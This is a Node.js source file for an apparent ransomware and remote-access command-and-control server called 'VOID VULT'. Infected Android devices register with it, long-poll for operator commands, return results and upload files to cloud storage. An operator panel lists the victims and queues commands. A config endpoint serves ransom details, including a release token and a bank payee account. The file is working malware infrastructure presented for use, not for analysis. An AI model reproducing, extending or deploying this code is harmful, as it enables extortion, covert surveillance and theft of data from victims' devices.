const express = require('express');
const multer = require('multer');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// ============================================================
//   SUPABASE
// ============================================================
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

if (!SUPABASE_URL || !SUPABASE_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_KEY environment variables');
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false }
});

// ============================================================
//   CONFIG
// ============================================================
const VALID_IDS = [
  "48291", "57394", "201019", "91028", "37654",
  "84021", "62517", "19483", "75062", "30918",
  "57120", "89643", "26307", "41985", "68210",
  "93574", "14758", "52036", "78419", "36142"
];

const BUCKET = 'void-files';
const LONG_POLL_MS = 25000;

function validId(id) { return VALID_IDS.includes(id); }
function now() { return Date.now(); }

// ============================================================
//   FILE UPLOAD SETUP
// ============================================================
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ============================================================
//   PAYLOAD ENDPOINTS
// ============================================================

// Payload registers device + binds user_id to android_id (first device wins)
app.post('/register', async (req, res) => {
  try {
    const { userId, device, android, battery, network, androidId } = req.body;
    if (!validId(userId)) return res.json({ ok: false, err: 'invalid id' });

    // Check existing binding
    const { data: existing } = await supabase
      .from('devices')
      .select('*')
      .eq('user_id', userId)
      .maybeSingle();

    if (existing) {
      // If already bound to a different device -> reject
      if (existing.android_id && androidId && existing.android_id !== androidId) {
        return res.json({ ok: false, err: 'code_in_use' });
      }
    }

    await supabase.from('devices').upsert({
      user_id: userId,
      android_id: androidId || existing?.android_id || null,
      device: device || 'unknown',
      android: android || '?',
      battery: battery || '?',
      network: network || '?',
      last_seen: now()
    }, { onConflict: 'user_id' });

    res.json({ ok: true });
  } catch (e) {
    console.error('register err', e);
    res.json({ ok: false, err: 'server' });
  }
});

// Long-poll for commands (holds connection open up to 25s)
app.get('/commands', async (req, res) => {
  const userId = req.query.device;
  if (!validId(userId)) return res.json({ ok: false, err: 'invalid' });

  // Update last_seen immediately
  await supabase.from('devices')
    .update({ last_seen: now() })
    .eq('user_id', userId);

  const deadline = Date.now() + LONG_POLL_MS;

  const check = async () => {
    // Grab pending undelivered commands
    const { data: cmds } = await supabase
      .from('commands')
      .select('*')
      .eq('user_id', userId)
      .eq('delivered', false)
      .order('created_at', { ascending: true });

    if (cmds && cmds.length) {
      // Mark as delivered
      const ids = cmds.map(c => c.id);
      await supabase.from('commands')
        .update({ delivered: true })
        .in('id', ids);

      const out = cmds.map(c => ({ id: String(c.id), cmd: c.cmd, args: c.args || '' }));
      return res.json({ ok: true, commands: out });
    }

    if (Date.now() >= deadline) {
      return res.json({ ok: true, commands: [] });
    }

    setTimeout(check, 1000);
  };

  check();
});

// Payload posts result
app.post('/result', async (req, res) => {
  try {
    const { userId, cmdId, cmd, data } = req.body;
    if (!validId(userId)) return res.json({ ok: false });

    await supabase.from('results').insert({
      user_id: userId,
      cmd_id: cmdId || '',
      cmd: cmd || '',
      data: (data || '').substring(0, 4000),
      created_at: now()
    });

    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

// Payload uploads file -> Supabase Storage
app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const { userId, type } = req.body;
    if (!validId(userId)) return res.json({ ok: false });
    if (!req.file) return res.json({ ok: false, err: 'no file' });

    const ext = (req.file.originalname.split('.').pop() || 'bin').toLowerCase();
    const path = userId + '/' + type.toLowerCase() + '_' + now() + '.' + ext;

    const { error: upErr } = await supabase.storage
      .from(BUCKET)
      .upload(path, req.file.buffer, {
        contentType: req.file.mimetype || 'application/octet-stream',
        upsert: false
      });

    if (upErr) {
      console.error('upload err', upErr);
      return res.json({ ok: false, err: upErr.message });
    }

    const { data: urlData } = supabase.storage.from(BUCKET).getPublicUrl(path);
    const publicUrl = urlData.publicUrl;

    await supabase.from('uploads').insert({
      user_id: userId,
      type: type || 'file',
      url: publicUrl,
      name: path.split('/').pop(),
      created_at: now()
    });

    res.json({ ok: true, url: publicUrl });
  } catch (e) {
    console.error('upload catch', e);
    res.json({ ok: false });
  }
});

// Payload fetches config (ransom text etc)
app.get('/config', (req, res) => {
  res.json({
    ok: true,
    releaseToken: '129010',
    payee: { bank: 'PALMPAY', account: '9153239545', name: 'TOBILOBA' },
    maxTries: 5
  });
});

// ============================================================
//   PANEL ENDPOINTS
// ============================================================

// Panel login
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username !== 'VOID') return res.json({ ok: false, err: 'invalid username' });
  if (!validId(password)) return res.json({ ok: false, err: 'invalid id' });
  res.json({ ok: true, token: 'void_' + password + '_' + now(), userId: password });
});

// Panel device list
app.get('/devices', async (req, res) => {
  try {
    const { data } = await supabase.from('devices').select('*');
    const list = (data || []).map(d => ({
      userId: d.user_id,
      device: d.device,
      android: d.android,
      battery: d.battery,
      network: d.network,
      lastSeen: d.last_seen,
      online: (now() - (d.last_seen || 0)) < 30000
    }));
    res.json({ ok: true, devices: list });
  } catch (e) {
    res.json({ ok: true, devices: [] });
  }
});

// Panel device detail
app.get('/device', async (req, res) => {
  try {
    const id = req.query.id;
    if (!validId(id)) return res.json({ ok: false });

    const { data: d } = await supabase.from('devices')
      .select('*').eq('user_id', id).maybeSingle();

    const { data: results } = await supabase.from('results')
      .select('*').eq('user_id', id)
      .order('created_at', { ascending: false })
      .limit(30);

    const { data: uploads } = await supabase.from('uploads')
      .select('*').eq('user_id', id)
      .order('created_at', { ascending: false })
      .limit(30);

    // Detect live/flash state from recent commands
    const { data: recentCmds } = await supabase.from('commands')
      .select('*').eq('user_id', id)
      .order('created_at', { ascending: false })
      .limit(20);

    let live = false, flash = false;
    if (recentCmds) {
      for (const c of recentCmds) {
        if (c.cmd === 'live' && !live) { live = c.args === 'on'; }
        if (c.cmd === 'flash' && !flash) { flash = c.args === 'on'; }
        if (live && flash) break;
      }
    }

    const online = d && (now() - (d.last_seen || 0)) < 30000;

    res.json({
      ok: true,
      userId: id,
      online: !!online,
      device: d?.device,
      android: d?.android,
      battery: d?.battery,
      network: d?.network,
      lastSeen: d?.last_seen,
      live: live,
      flash: flash,
      results: (results || []).reverse().map(r => ({
        cmd: r.cmd, data: r.data, at: r.created_at
      })),
      uploads: (uploads || []).reverse().map(u => ({
        type: u.type, url: u.url, name: u.name, at: u.created_at
      }))
    });
  } catch (e) {
    console.error('device err', e);
    res.json({ ok: false });
  }
});

// Panel sends command
app.post('/send', async (req, res) => {
  try {
    const { userId, cmd, args } = req.body;
    if (!validId(userId)) return res.json({ ok: false });

    await supabase.from('commands').insert({
      user_id: userId,
      cmd: cmd,
      args: args || '',
      created_at: now(),
      delivered: false
    });

    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

// ============================================================
//   CLEANUP (auto-run every hour)
// ============================================================
async function cleanup() {
  try {
    const cutoff = now() - (24 * 60 * 60 * 1000); // 24h ago
    await supabase.from('results').delete().lt('created_at', cutoff);
    await supabase.from('commands').delete().lt('created_at', cutoff).eq('delivered', true);
    console.log('cleanup done');
  } catch (e) {
    console.error('cleanup err', e);
  }
}
setInterval(cleanup, 60 * 60 * 1000);

// ============================================================
//   HEALTH
// ============================================================
app.get('/', (req, res) => {
  res.send('VOID VULT SERVER ONLINE — ' + new Date().toISOString());
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('VOID VULT listening on ' + PORT));